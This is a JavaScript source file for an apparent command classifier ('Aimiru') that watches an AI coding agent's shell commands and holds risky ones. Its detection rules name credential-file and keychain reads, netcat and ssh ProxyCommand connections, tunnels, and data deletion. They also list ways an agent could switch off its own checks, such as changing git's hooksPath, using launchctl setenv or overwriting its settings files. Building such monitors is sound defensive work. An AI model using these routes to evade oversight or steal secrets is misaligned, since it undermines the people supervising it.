          const word = glued ? glued[1] : rest[k] === '-f' || rest[k] === '--file' ? rest[k + 1] : null;
          if (word == null) continue;
          const p = (glued ? restDyn[k] : restDyn[k + 1]) ? null : resolvePathWord(word, ctx);
          if (p && (isProtectedPath(p, ctx) || holdsProtectedPath(p, ctx))) {
            // Named once: the hooks switch named in the command has already been read as this change.
            if (!/disableallhooks/i.test(joined)) protectedChange(out, `changes ${p}, the agent's own settings or Aimiru's files`);
            return;
          }
        }
      }
      const keyDynamic = Boolean(settingDyn[keyAt]) || (keyAt === 1 && settingDyn[0]);
      if (key === 'core.hookspath' && (sets || unsets)) nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, 'changes where git takes its guards from (core.hooksPath)');
      else if (sections && (key === 'core' || (setting[keyAt + 1] || '').toLowerCase() === 'core' || keyDynamic)) nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, 'changes where git takes its guards from (git config removes or renames the core section)');
      else if (keyDynamic && (sets || unsets)) {
        nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, 'may change where git takes its guards from (a setting named only when the command runs)');
        unknownProgram(out, 'changes a git setting named only when the command runs');
        return;
      }
      if (rest.includes('--edit') || setting[0] === 'edit' || (sets && (/^(alias|include|includeif)\./.test(key) || GIT_COMMAND_SETTINGS.test(key) || key === 'core.hookspath'))) {
        unknownProgram(out, 'changes git settings that run commands');
        return;
      }
      // A proxy, or another address for pushes, sends git's later fetches and pushes (sign-ins
      // with them) through another computer, while the push still names its repository (review of
      // wk/connectors-flow, 28 Oct): held and asked, as the settings that run commands are.
      if (sets && GIT_ROUTE_SETTINGS.test(key)) {
        unknownProgram(out, 'changes where git sends its fetches and pushes');
        return;
      }
      if (sets && rest.some((a) => /^(--global|--system|--file|-f|--blob)(=|$)/.test(a))) {
        out.classes.push('write');
        out.why.push('changes git settings outside the project');
      }
      return;
    }
    if (GIT_LOCAL_STEPS.has(sub) || sub === '') return;
    unknownProgram(out, `runs "git ${sub}", which Aimiru does not know as local work`);
    return;
  }
  if (prog === 'gh' || prog === 'glab') {
    const sub = nonFlags(args).slice(0, 2).map((s) => s.toLowerCase());
    const [a, b] = sub;
    if (a === 'auth' || (LOGIN_COMMANDS.gh || []).some((seq) => hasSeq(args, seq))) {
      out.classes.push('login');
      return;
    }
    if ((a === 'repo' || a === 'release' || a === 'gist' || a === 'label' || a === 'secret' || a === 'variable' || a === 'run' || a === 'cache' || a === 'issue' || a === 'pr') && b === 'delete') {
      out.classes.push('delete');
      out.counterparty = 'github.com';
      return;
    }
    if ((a === 'repo' && b === 'edit' && /visibility/.test(joined)) || (a === 'gist' && b === 'create' && /--public|-p\b/.test(joined)) || (a === 'repo' && b === 'create' && /--public/.test(joined))) {
      out.classes.push('share');
      out.counterparty = 'github.com';
      return;
    }
    if (((a === 'pr' || a === 'mr') && /^(create|comment|review|merge|close|reopen|edit|ready)$/.test(b || '')) ||
      (a === 'issue' && /^(create|comment|close|reopen|edit|transfer|lock)$/.test(b || '')) ||
      (a === 'release' && /^(create|upload|edit)$/.test(b || '')) ||
      (a === 'gist' && b === 'create') ||
      (a === 'repo' && /^(create|fork|archive|rename)$/.test(b || '')) ||
      (a === 'workflow' && b === 'run') || (a === 'secret' && b === 'set')) {
      out.classes.push('send');
      out.counterparty = 'github.com';
      out.why.push(`posts to GitHub: ${a} ${b}`);
      return;
    }
    if (a === 'api') {
      const m = (flagValue(args, ['-X', '--method']) || (args.some((x) => /^(-f|-F|--field|--raw-field|--input)$/.test(x)) ? 'POST' : 'GET')).toUpperCase();
      out.counterparty = 'github.com';
      out.classes.push(m === 'GET' ? 'other' : m === 'DELETE' ? 'delete' : 'send');
      return;
    }
    out.classes.push('other');
    return;
  }
  for (const [tool, subs] of Object.entries(PUBLISH)) {
    if (prog === tool && (subs.includes(firstNonFlag(args)) || (tool === 'vercel' && args.includes('--prod')))) {
      out.classes.push('send');
      out.why.push(`publishes with ${tool}`);
      const step = builderStep(prog, args);
      if (step) nameBuilderStep(out, step.resource);
      return;
    }
  }
  // ssh -o ProxyCommand=..., rsync -e ...: a command run on this computer.
  if (['ssh', 'scp', 'sftp', 'rsync'].includes(prog)) {
    for (let k = 0; k < args.length; k += 1) {
      const o = /^-o\s*(proxycommand|localcommand)\s*=\s*(.*)$/is.exec(args[k] === '-o' ? `-o${args[k + 1] ?? ''}` : args[k]);
      if (o) classifyCommandText(o[2], argDyn[k] || argDyn[k + 1], ctx, out, depth);
    }
    const e = prog === 'rsync' ? flagValue(args, ['-e', '--rsh']) : null;
    if (e) classifyCommandText(e, false, ctx, out, depth);
  }
  if (['scp', 'sftp'].includes(prog) || (prog === 'rsync' && args.some((a) => /^[^/\s]*[^\\]:/.test(a) && !/^[A-Za-z]:\\/.test(a)))) {
    const remoteIdx = args.findIndex((a) => /^[^-][^/\s]*:/.test(a));
    const last = args[args.length - 1] || '';
    const uploading = /^[^-][^/\s]*:/.test(last) && remoteIdx === args.length - 1;
    if (uploading || prog === 'sftp') {
      // The remote host is where the files go (ADR-0146): sftp's is its first word that is not an option.
      const dest = prog === 'sftp' ? readOptions(args, argDyn, SFTP_OPTIONS).positional[0] : { word: last, dynamic: argDyn[args.length - 1] };
      // An option that can send ssh elsewhere leaves the real host unknown, whatever the name says.
      const t = sshMayGoElsewhere(prog, args, argDyn) ? { host: null, unknown: true, local: false } : remoteHostOf(dest?.word, Boolean(dest?.dynamic));
      // To this computer nothing leaves it: other, as nc and ssh to it are.
      if (t.local) out.classes.push('other');
      else sharesWith(out, t.unknown ? null : t.host, { unknown: t.unknown || !t.host });
    } else out.classes.push('other');
    out.why.push(uploading ? 'copies files to another computer' : 'copies files from another computer');
    if (!uploading) classifyTargetsForWrite([last], null, ctx, out);
    return;
  }
  // ftp and its kin move files to and from the host they name, as sftp does (quality review of
  // wk/connectors-flow: ADR-0146 said ftp was held, and it went ahead as other): share with that
  // host, or with none and held when it cannot be read. Options that take a value are skipped.
  if (['ftp', 'tnftp', 'lftp', 'ncftp', 'ncftpput', 'ncftpget'].includes(prog)) {
    let k = 0;
    while (k < args.length && String(args[k]).startsWith('-')) k += /^-[PorsTqufecpjm]$/.test(String(args[k])) ? 2 : 1;
    const t = k < args.length ? remoteHostOf(args[k], Boolean(argDyn[k])) : { host: null, unknown: true, local: false };
    if (t.local) out.classes.push('other');
    else sharesWith(out, t.unknown ? null : t.host, { unknown: t.unknown || !t.host });
    out.why.push('moves files to or from another computer');
    return;
  }
  if (['ngrok', 'cloudflared', 'localtunnel', 'lt', 'bore', 'serveo'].includes(prog) || (prog === 'tailscale' && /funnel|serve/.test(joined))) {
    out.classes.push('share');
    out.why.push('opens this computer to the internet');
    return;
  }

  // Payments and purchases.
  if (prog === 'stripe') {
    if (firstNonFlag(args) === 'post' || /(charges|payment_?intents|payouts|transfers|refunds|invoices|subscriptions|checkout|payment_?links|topups|setup_?intents)\b/.test(lowerArgs.join(' ')) && /\b(create|pay|confirm|capture|finalize|send)\b/.test(lowerArgs.join(' '))) {
      out.classes.push('spend');
      out.counterparty = 'stripe.com';
      out.resource = 'money.card';
      return;
    }
    if (firstNonFlag(args) === 'login') {
      out.classes.push('login');
      return;
    }
    out.classes.push('other');
    return;
  }
  if ((prog === 'cast' && /^(send|publish|mktx)$/.test(firstNonFlag(args))) ||
    (prog === 'solana' && firstNonFlag(args) === 'transfer') ||
    (prog === 'spl-token' && /^(transfer|mint)$/.test(firstNonFlag(args))) ||
    (prog === 'bitcoin-cli' && /^(send|sendtoaddress|sendmany|sendrawtransaction)$/.test(firstNonFlag(args)))) {
    out.classes.push('spend');
    out.why.push('moves money');
    return;
  }
  if (lowerArgs.some((a) => a === 'buy' || a === 'purchase' || a === 'checkout' || a === 'pay') ||
    (prog === 'aws' && /\b(purchase-|register-domain|create-savings-plan|accept-offer)/.test(lowerArgs.join(' '))) ||
    (prog === 'gcloud' && hasSeq(args, ['domains', 'registrations', 'register']))) {
    out.classes.push('spend');
    out.why.push('buys something');
    return;
  }

  // Signing in and credentials.
  for (const [tool, seqs] of Object.entries(LOGIN_COMMANDS)) {
    if (prog === tool && seqs.some((seq) => hasSeq(args, seq))) {
      out.classes.push('login');
      out.why.push(`signs in with ${tool}`);
      return;
    }
  }
  if (['passwd', 'chpasswd', 'ssh-add', 'kinit', 'login', 'su'].includes(prog) ||
    (prog === 'security' && /^(find-generic-password|find-internet-password|add-generic-password|add-internet-password|delete-generic-password|delete-internet-password|dump-keychain|unlock-keychain|export)$/.test(firstNonFlag(args)))) {
    out.classes.push('login');
    out.why.push('uses saved passwords or keys');
    return;
  }
  if (['cat', 'less', 'more', 'head', 'tail', 'bat', 'cp', 'base64', 'xxd', 'strings', 'get-content', 'type', 'scp', 'open'].includes(prog)) {
    for (let k = 0; k < args.length; k += 1) {
      const p = argDyn[k] ? null : resolvePathWord(args[k], ctx);
      if (isCredentialFile(p)) {
        out.classes.push('login');
        out.why.push(`reads a credential file: ${p}`);
        return;
      }
    }
  }

  // Framework tasks that drop or rebuild a database (ADR-0039): rails db:drop, prisma migrate reset.
  {
    const step = prog === 'rails' || prog === 'rake' || prog === 'prisma' ? builderStep(prog, args) : null;
    if (step) {
      out.classes.push(step.cls);
      nameBuilderStep(out, step.resource);
      out.why.push('drops or rebuilds a database');
      return;
    }
  }

  // Databases and cloud: destructive operations.
  if (DB_CLIENTS.has(prog) && (SQL_DESTRUCTIVE.test(joined) || (prog === 'supabase' && hasSeq(args, ['db', 'reset'])) || (prog === 'dropdb'))) {
    out.classes.push('delete');
    out.why.push('deletes data in a database');
    if (SQL_DROP.test(joined) || (prog === 'supabase' && hasSeq(args, ['db', 'reset']))) {
      nameBuilderStep(out, BUILDER_RESOURCES.dbDrop);
    }
    return;
  }
  if (prog === 'dropdb' || prog === 'dropuser') {
    out.classes.push('delete');
    if (prog === 'dropdb') nameBuilderStep(out, BUILDER_RESOURCES.dbDrop);
    return;
  }
  if (DB_CLIENTS.has(prog) && prog !== 'supabase') {
    out.classes.push('other');
    out.why.push(`works with a database through ${prog}`);
    return;
  }
  if (CLOUD_CLIS.has(prog)) {
    const verbs = lowerArgs.join(' ');
    // A delete step Aimiru reads in its place deletes cloud data (data.cloud, ADR-0090); a delete word
    // anywhere else keeps the class and names nothing, so it is asked about as before.
    if (isCloudDeletion(prog, args)) {
      deletesCloudData(out, `deletes cloud or server data with ${prog}`);
      return;
    }
    if (/\b(delete|destroy|remove|rm|rb|terminate|uninstall|purge|prune|wipe)\b|\bdelete-[a-z-]+|\bterminate-[a-z-]+|apply\s+.*-destroy|\bdeprovision\b/.test(verbs) && !/^(docker|podman)$/.test(prog)) {
      out.classes.push('delete');
      out.why.push(`deletes with ${prog}`);
      return;
    }
    if ((prog === 'docker' || prog === 'podman') && (/\b(volume\s+(rm|prune)|system\s+prune|image\s+prune\s+-a)\b/.test(verbs))) {
      out.classes.push('delete');
      return;
    }
    if (prog === 'aws' && /\bs3\s+(cp|sync|mv)\b/.test(verbs) && /\bs3:\/\//.test(verbs)) {
      const lastArg = nonFlags(args).slice(-1)[0] || '';
      out.classes.push(lastArg.startsWith('s3://') ? 'share' : 'other');
      return;
    }
    if (prog === 'gsutil' && /\b(cp|rsync|mv)\b/.test(verbs)) {
      const lastArg = nonFlags(args).slice(-1)[0] || '';
      out.classes.push(lastArg.startsWith('gs://') ? 'share' : 'other');
      return;
    }
    if (/\b(acl|iam|policy|share|grant|add-iam-policy-binding|set-iam-policy|put-bucket-acl|put-bucket-policy|public-read|allusers)\b/.test(verbs)) {
      out.classes.push('share');
      return;
    }
    out.classes.push('other');
    return;
  }

  // System and file writes outside the project.
  if (SYSTEM_WRITERS.has(prog)) {
    const sub = firstNonFlag(args);
    if (prog === 'crontab' && args.includes('-r')) out.classes.push('delete');
    else if (prog === 'defaults' && !/^(write|delete|import|rename)$/.test(sub)) out.classes.push('read');
    else if (prog === 'launchctl' && /^(list|print|blame|getenv)$/.test(sub)) out.classes.push('read');
    // What launchd hands every program it starts at login, Aimiru's runner among them: a setting
    // there can turn Claude Code's checks off (CLAUDE_CODE_SIMPLE, CLAUDE_CODE_SAFE_MODE), load code
    // into the check (NODE_OPTIONS) or point it elsewhere (security review of wk/runner).
    else if (prog === 'launchctl' && /^(setenv|config)$/.test(sub)) {
      out.classes.push('write');
      protectedChange(out, `changes what every program started at login gets with launchctl ${sub}, which can turn Aimiru's check off`);
    }
    else if (prog === 'systemctl' && /^(status|show|list-units|is-active|cat)$/.test(sub)) out.classes.push('read');
    else if (prog === 'crontab' && args.includes('-l')) out.classes.push('read');
    else {
      out.classes.push(prog === 'dscl' && /-create|-passwd/.test(joined) ? 'login' : 'write');
      out.why.push(`changes system settings with ${prog}`);
    }
    return;
  }
  if (FILE_WRITERS_LAST_ARG.has(prog)) {
    const nf = [];
    const nd = [];
    args.forEach((a, k) => {
      if (!a.startsWith('-')) {
        nf.push(a);
        nd.push(argDyn[k]);
      }
    });
    const t = flagValue(args, ['-t', '--target-directory']);
    if (t) classifyTargetsForWrite([t], null, ctx, out);
    else if (nf.length >= 2) classifyTargetsForWrite([nf[nf.length - 1]], [nd[nd.length - 1]], ctx, out);
    // Where each source lands (landsOnProtected): "cp x/settings.json ~/.claude/" writes over a
    // protected file the destination word does not name, and "cp -r x/.claude ~" lands a folder
    // holding one.
    const into = t || (nf.length >= 2 && !nd[nd.length - 1] ? nf[nf.length - 1] : null);
    const intoAbs = into ? resolvePathWord(into, ctx) : null;
    const sources = t ? nf : nf.slice(0, -1);
    const sourcesDyn = t ? nd : nd.slice(0, -1);
    if (intoAbs && !isProtectedPath(intoAbs, ctx)) {
      const landed = landsOnProtected(prog, args, sources, sourcesDyn, intoAbs, ctx, out);
      if (landed) protectedChange(out, `writes ${landed}, the agent's own settings or Aimiru's files or a folder holding them`);
    }
    if ((prog === 'mv' || prog === 'move-item') && nf.length >= 2) {
      // Moving a file away from outside the project removes it from where it was; moving the maker's
      // settings or Aimiru's own files away (or a folder holding them) is a change to them.
      sources.forEach((src, k) => {
        const p = nd[k] ? null : resolvePathWord(src, ctx);
        if (p && (isProtectedPath(p, ctx) || holdsProtectedPath(p, ctx))) protectedChange(out, `moves ${p} away, the agent's own settings or Aimiru's files`);
        else if (prog === 'mv' && (!p || !isInsideWorkArea(p, ctx))) out.classes.push('write');
      });
    }
    for (const src of nf.slice(0, -1)) {
      if (isCredentialFile(resolvePathWord(src, ctx))) out.classes.push('login');
    }
    return;
  }
  if (FILE_WRITERS_ALL_ARGS.has(prog)) {
    const targets = [];
    const tdyn = [];
    let skipNext = false;
    args.forEach((a, k) => {
      if (skipNext) {
        skipNext = false;
        return;
      }
      if (a.startsWith('-')) {
        if (/^-(m|o|g|-mode|-owner|-reference)$/.test(a)) skipNext = true;
        return;
      }
      targets.push(a);
      tdyn.push(argDyn[k]);
    });
    const files = ['chmod', 'chown', 'chgrp'].includes(prog) ? targets.slice(1) : targets;
    classifyTargetsForWrite(files, ['chmod', 'chown', 'chgrp'].includes(prog) ? tdyn.slice(1) : tdyn, ctx, out);
    return;
  }
  if (prog === 'sed' || prog === 'gsed') {
    // Every script (-e, --expression and its prefixes, or the first operand) is read: the e
    // command and s///e run programs; w writes files. Files edited in place must be in the project.
    const { scripts, scriptFiles, files, ambiguous } = sedInvocation(args);
    if (ambiguous) {
      unknownProgram(out, `runs ${prog} with an option Aimiru cannot place`);
      return;
    }
    // Script files are read when they are in the project; anywhere else, or unreadable, unknown.
    for (const f of scriptFiles) {
      let text = null;
      if (f !== '-' && insideProject(f, false, ctx)) {
        try {
          text = fs.readFileSync(resolvePathWord(f, ctx), 'utf8');
        } catch {
          text = null;
        }
      }
      if (text == null) {
        unknownProgram(out, `runs ${prog} with a script Aimiru cannot read`);
        return;
      }
      scripts.push(text);
    }
    for (const script of scripts) {
      const effects = sedScriptEffects(script);
      if (effects.runs) {
        unknownProgram(out, `runs another program through ${prog}`);
        return;
      }
      classifyTargetsForWrite(effects.writes, null, ctx, out);
    }
    if (args.some((a) => /^-[A-Za-z]*i/.test(a) || /^--in-?(place)?(=|$)/.test(a) || /^--in-p/.test(a))) classifyTargetsForWrite(files, null, ctx, out);
    return;
  }
  if (prog === 'perl' && args.some((a) => /^-[A-Za-z]*i/.test(a))) {
    const files = nonFlags(args).filter((a) => !/^s[/|#]/.test(a));
    classifyTargetsForWrite(files, null, ctx, out);
    return;
  }

  // Local tools with options that run another program, and build tools pointed elsewhere.
  if (hasDangerousOption(prog, args, argDyn)) {
    unknownProgram(out, `runs another program through ${prog}`);
    return;
  }
  const elsewhere = buildToolOutside(prog, args, argDyn, ctx);
  if (elsewhere) {
    unknownProgram(out, elsewhere);
    return;
  }
  if (prog === 'make' || prog === 'gmake') {
    // $(shell ...), ${shell ...} and backticks run commands when make reads them, in an argument
    // or in a variable it is given.
    if ([...args, ...assignments.map((a) => a.w)].some((a) => /\$[({]\s*shell\b|`/.test(a))) {
      unknownProgram(out, 'runs commands through make');
      return;
    }
    // make NAME=value overrides the makefile: SHELL changes what runs every recipe; a value with
    // spaces may be a command a recipe runs.
    args.forEach((a, k) => {
      if (!ASSIGNMENT_RE.test(a)) return;
      const name = variableName(a);
      const value = a.slice(a.indexOf('=') + 1);
      if (['SHELL', '.SHELLFLAGS', 'MAKEFLAGS', 'MAKEFILES', 'MFLAGS'].includes(name)) unknownProgram(out, `runs make with ${name} set`);
      else if (/^[/~]|^\.\.([/\\]|$)|^[A-Za-z]:[\\/]/.test(value) && !insideProject(value, argDyn[k], ctx)) unknownProgram(out, `runs make with ${name} set to a path outside the project`);
      else if (/\s/.test(value.trim())) classifyCommandText(value, argDyn[k], ctx, out, depth);
    });
    // make deploy, make release-prod: a deploy (code.deploy, ADR-0090).
    const ship = makeTargets(args).find((t, k) => !argDyn[args.indexOf(t)] && isShipName(t));
    if (ship) deployTarget(out, `make ${ship}`);
    // The makefile is the program make runs: a new or changed one is a program the agent wrote
    // (ADR-0090 review).
    const makefile = makefileOf(args, argDyn, ctx);
    if (makefile) noteProgram(out, makefile, false, ctx, 'makefile');
  }
  if (['awk', 'gawk', 'mawk', 'nawk'].includes(prog) && /system\s*\(|\|\s*&?\s*getline|\|&|(print|printf)\b[^;}]*\|\s*["$\w]/.test(joined)) {
    unknownProgram(out, `runs another program through ${prog}`);
    return;
  }
  // Archives: where they are written or unpacked.
  if (['tar', 'bsdtar', 'gtar'].includes(prog)) {
    const first = /^-?([A-Za-z]+)$/.exec(args[0] || '');
    const creating = (first && /[cru]/.test(first[1])) || args.some((a) => /^--(create|append|update)$/.test(a));
    const file = first && first[1].includes('f') ? args[1] : flagValue(args, ['-f', '--file']);
    const dir = flagValue(args, ['-C', '--directory']);
    classifyTargetsForWrite([...(creating && file ? [file] : []), ...(!creating && dir ? [dir] : [])], null, ctx, out);
    // Unpacking writes files Aimiru cannot list: a program run after it may not be the committed one.
    if (!creating && args.length) out.treeChanges = true;
    return;
  }
  if (prog === 'unzip') {
    const dir = flagValue(args, ['-d']);
    if (dir) classifyTargetsForWrite([dir], null, ctx, out);
    if (args.length) out.treeChanges = true;
    return;
  }
  if (prog === 'zip') {
    const archive = nonFlags(args)[0];
    if (archive) classifyTargetsForWrite([archive], null, ctx, out);
    return;
  }

  // Package managers and runners: their own options, the step, and commands they run for you.
  if (PACKAGE_MANAGERS[prog]) {
    const pm = packageManagerInvocation(prog, args, argDyn, ctx);
    if (pm.unknown) {
      unknownProgram(out, pm.unknown);
      return;
    }
    const rest = wordsFrom(args, argDyn, argExp, quoted.slice(1), pm.at + 1);
    if ((prog === 'npm' && (pm.sub === 'exec' || pm.sub === 'x')) || ((prog === 'pnpm' || prog === 'yarn') && pm.sub === 'dlx') || (prog === 'bun' && pm.sub === 'x')) {
      classifyPackageRun(`${prog} ${pm.sub}`, rest, ctx, out, depth);
      return;
    }
    if ((prog === 'pnpm' || prog === 'yarn') && pm.sub === 'exec') {
      classifyWrappedCommand(`${prog} exec`, rest, ctx, out, depth, { switches: ['-r', '--recursive', '--parallel', '--no-bail', '--report-summary', '--workspace-root', '-w'], shellFlags: ['-c', '--shell-mode'] });
      return;
    }
    if (prog === 'bun' && pm.sub === 'exec') {
      classifyCommandText(rest.words.join(' '), rest.dynamic.some(Boolean), ctx, out, depth);
      return;
    }
    // npm run deploy, pnpm release, yarn ship: a deploy (code.deploy, ADR-0090).
    const script = packageScriptOf(prog, pm, args, argDyn, ctx);
    if (script && isShipName(script)) {
      deployTarget(out, `the ${script} script`);
      return;
    }
    // bun x.ts, bun run x.ts: a project file run as a program (ADR-0090).
    if (prog === 'bun') {
      const file = bunProgramFile(args, argDyn, ctx, pm);
      if (file) noteProgram(out, file, false, ctx, 'bun');
    }
    // The scripts it runs come from package.json: changed scripts are a program the agent wrote
    // (ADR-0090 review), so editing "test" and running npm test is asked about as a new file is.
    if (pm.dir && runsPackageScripts(prog, pm, args, argDyn, ctx)) noteProgram(out, path.join(pm.dir, 'package.json'), false, ctx, 'scripts');
  }
  if (['npx', 'pnpx', 'bunx'].includes(prog)) {
    classifyPackageRun(prog, wordsFrom(args, argDyn, argExp, quoted.slice(1), 0), ctx, out, depth);
    return;
  }
  const step = nonFlagIndex(args);
  if ((prog === 'poetry' && args[step] === 'run') || (prog === 'bundle' && args[step] === 'exec')) {
    classifyWrappedCommand(`${prog} ${args[step]}`, wordsFrom(args, argDyn, argExp, quoted.slice(1), step + 1), ctx, out, depth, { switches: ['--keep-file-descriptors'] });
    return;
  }
  if (prog === 'uv' && args[step] === 'run') {
    // uv run may download what the project needs first: at least "other".
    out.classes.push('other');
    out.why.push('runs a command after uv prepares its packages');
    classifyWrappedCommand('uv run', wordsFrom(args, argDyn, argExp, quoted.slice(1), step + 1), ctx, out, depth);
    return;
  }
  if (prog === 'go' && args[step] === 'run') {
    // go run ./cmd/app is the project's code; go run example.com/tool@v1 downloads someone else's.
    const target = args[step + 1 + nonFlagIndex(args.slice(step + 1))];
    if (target === undefined || target.includes('@') || /^[^./~][^/]*\.[^/]+\//.test(target)) {
      out.classes.push('other');
      out.why.push('downloads and runs a Go program');
    } else if (!insideProject(target, false, ctx)) unknownProgram(out, 'runs a Go program from outside the project');
    return;
  }

  const sub = firstNonFlag(args);
  // Installs and other network use.
  if (INSTALL_SUBCOMMANDS[prog] && (INSTALL_SUBCOMMANDS[prog].includes(sub) || (prog === 'yarn' && args.length === 0))) {
    out.classes.push('other');
    out.why.push(`installs or downloads with ${prog}`);
    return;
  }
  if (NETWORK_PROGRAMS.has(prog)) {
    // nc, ncat, netcat and telnet to a host, not listening, and ssh given input or a command built
    // when it runs, send data to that host (ADR-0146); to this computer, other as before.
    const conn = connectionOf(prog, args, argDyn, seg);
    if (conn && !conn.local) {
      sharesWith(out, conn.unknown ? null : conn.host, { unknown: conn.unknown || !conn.host, why: `sends data to another computer with ${prog}` });
      return;
    }
    out.classes.push('other');
    return;
  }
  // turbo run deploy, nx deploy app, nx run app:release: a deploy (code.deploy, ADR-0090).
  if (prog === 'turbo' || prog === 'nx') {
    const ship = taskRunnerTargets(prog, args).find((t) => isShipName(t));
    if (ship) deployTarget(out, `${prog} ${ship}`);
  }
  // tsx x.ts, ./tmp.sh, scripts/run.py: a program run from a file of the project is new when it is
  // not in the last commit (ADR-0090).
  if (SCRIPT_RUNNERS.has(prog)) {
    // The script is the first word that is not an option, nor maybe an option's value (ts-node -P
    // tsconfig.json x.ts): each word up to the first that follows no option is noted, and the
    // lookup tells which of them are files (ADR-0090 review). tsx watch x.ts runs x.ts.
    let afterOption = false;
    for (let k = 0; k < args.length; k += 1) {
      const a = String(args[k]);
      if (a === '--') {
        if (args[k + 1] !== undefined) noteProgram(out, args[k + 1], argDyn[k + 1], ctx, programKind(prog));
        break;
      }
      if (a.startsWith('-') && a !== '-') {
        afterOption = !a.includes('=');
        continue;
      }
      if (prog === 'tsx' && k === 0 && a === 'watch') continue;
      noteProgram(out, a, argDyn[k], ctx, programKind(prog));
      if (!afterOption) break;
      afterOption = false;
    }
  } else if (/[\\/]/.test(words[0]) && insideProject(words[0], false, ctx)) {
    noteProgram(out, words[0], false, ctx);
  }
  // Only known local work is "read" (spec §8.1). A program Aimiru does not know is "other" and
  // held when Aimiru cannot be asked: it may be a renamed or new tool that spends or sends.
  if (isLocalWork(prog, words[0], args, argDyn, ctx)) return;
  unknownProgram(out, `runs ${prog}, which Aimiru does not know as local work`);
}

function classifyInto(command, ctx, out, depth = 0) {
  if (depth > MAX_DEPTH) {
    // Nested deeper than any real command needs: what runs at the bottom is not read.
    unknownProgram(out, 'runs commands nested too deep to read');
    return;
  }
  const { segments, nested } = lexShell(command, { powershell: ctx.powershell === true });
  segments.forEach((seg, i) => {
    // The step a pipe feeds this one from: what it prints is what this one reads (shownOutput).
    if (seg.piped && i > 0) Object.defineProperty(seg, 'pipeFrom', { value: segments[i - 1], enumerable: false });
  });
  for (const seg of segments) {
    // A step that pays, sends, shares, books, deletes or signs in without being a builder step
    // (ADR-0039 review): the command is then checked as before builder steps had names, so a rule
    // that allows deploys never lets "vercel deploy; scp key host:" or "...; curl <hook>" through.
    const classesBefore = out.classes.length;
    const stepsBefore = out.builderSteps || 0;
    // The step a resource is named in (ADR-0096): a command run inside this one names its own.
    const outerStep = out.currentStep;
    out.currentStep = seg;
    try {
      classifySegment(seg, ctx, out, depth);
    } finally {
      out.currentStep = outerStep;
    }
    if ((out.builderSteps || 0) === stepsBefore && out.classes.slice(classesBefore).some((c) => CONSEQUENTIAL.has(c))) {
      out.otherSteps = true;
    }
  }
  for (const inner of nested) classifyInto(inner, ctx, out, depth + 1);
}

/**
 * The lists that decide what is local work and which settings are harmless, for connectors written
 * in other languages (Aimiru for Hermes keeps a copy in sayso/local-work.json; a test compares).
 */
export function localWorkTables() {
  const sorted = (xs) => [...xs].sort();
  const steps = {};
  for (const [k, v] of Object.entries(LOCAL_STEPS)) steps[k] = [...v];
  for (const [k, v] of Object.entries(PACKAGE_MANAGERS)) steps[k] = [...v.steps];
  return {
    about: 'Generated from connectors/shared/classify.mjs (localWorkTables). Do not edit by hand.',
    programs: sorted(LOCAL_PROGRAMS),
    steps,
    packageScripts: Object.keys(PACKAGE_MANAGERS).filter((k) => PACKAGE_MANAGERS[k].scripts),
    gitLocalSteps: sorted(GIT_LOCAL_STEPS),
    gitNetworkSteps: [...INSTALL_SUBCOMMANDS.git],
    recognisedOther: sorted(new Set([...NET_CLIENTS, ...NETWORK_PROGRAMS, ...CLOUD_CLIS, ...DB_CLIENTS])),
    wrappers: sorted(WRAPPERS),
    shells: sorted(SHELLS),
    interpreters: sorted(INLINE_INTERPRETERS),
    benignEnv: sorted(BENIGN_ENV_VARS),
    benignEnvFamilies: BENIGN_ENV_FAMILIES.source,
    pagerEditorVars: sorted(PAGER_EDITOR_VARS),
    programsReadThese: PROGRAMS_READ_THESE.source,
    modulePathVars: sorted(MODULE_PATH_ENV_VARS),
    trustedPathDirs: [...TRUSTED_PATH_DIRS],
    systemBinDirs: [...SYSTEM_BIN_DIRS],
    // Option tables (regular expressions as their source text; functions are ported by hand).
    dangerousOptions: plainData(DANGEROUS_OPTIONS),
    pathOptions: plainData(PATH_OPTIONS),
    compilerDanger: Object.fromEntries(Object.entries(COMPILER_DANGER).map(([k, v]) => [k, v.source])),
    interpreterOptions: plainData(INTERPRETER_OPTIONS),
    pythonLocalModules: sorted(PYTHON_LOCAL_MODULES),
    runsProgramsRe: RUNS_PROGRAMS_RE.source,
    gitCommandSettings: GIT_COMMAND_SETTINGS.source,
    gitGlobalSwitches: GIT_GLOBAL_SWITCHES.source,
    gitValueOptions: [...GIT_VALUE_OPTS],
    gitSettingsVariables: GIT_SETTINGS_VARIABLES.source,
    sedLong: [...SED_LONG],
    sedLongValue: [...SED_LONG_VALUE],
    devTools: Object.fromEntries(DEV_TOOLS),
    dlxSwitches: sorted(DLX_SWITCHES),
  };
}

function plainData(value) {
  return JSON.parse(JSON.stringify(value, (k, v) => (v instanceof RegExp ? v.source : typeof v === 'function' ? undefined : v)));
}

/** A Link spend request named anywhere in a command, read or not (checkout asks Aimiru, ADR-0065). */
const LINK_SPEND_TEXT = /link-cli[\s\S]{0,400}?\bspend-request\s+(?:create|update)\b/;

/**
 * Link spend requests in a command's own simple commands (create, or update with a new amount):
 * each one's cart, whether the text names one at all (inside a substitution, an eval, a script),
 * and whether the spend request is the whole command (`sole`): one simple command, nothing run
 * inside it, no output written anywhere but /dev/null. Only then does its cart speak for the
 * command; otherwise the other steps (another payment, a deletion) would hide behind its amount.
 */
function linkRequestsIn(text, powershell) {
  const found = [];
  let sole = false;
  try {
    const lexed = lexShell(text, { powershell });
    const segments = lexed.segments || [];
    for (const seg of segments) {
      const r = linkSpendRequest(seg.words, seg.dynamic);
      if (r) found.push(r);
    }
    sole =
      found.length === 1 &&
      segments.length === 1 &&
      (lexed.nested || []).length === 0 &&
      (segments[0].redirects || []).every((r) => String(r.op).startsWith('<') || (r.target === '/dev/null' && !r.dynamic));
  } catch {
    // unreadable: the text still says whether it names one
  }
  return { found, sole, mentioned: found.length > 0 || LINK_SPEND_TEXT.test(text) };
}

/**
 * Classifies a shell command (Bash or PowerShell text).
 * A Link spend request is a payment with its cart (checkout, amount, currency, the store as
 * counterparty) when it is the whole command; more than one, one Aimiru cannot read, or one with
 * other steps around it (another payment, a deletion, a command run inside it) is a payment with
 * no cart, so the person is asked.
 * @returns {{class: string, counterparty: string|null, resource: string|null, sensitive: boolean, why: string[], checkout?: object, amount?: number, currency?: string}}
 */
export function classifyCommand(command, ctx = makePathContext(), { powershell = false } = {}) {
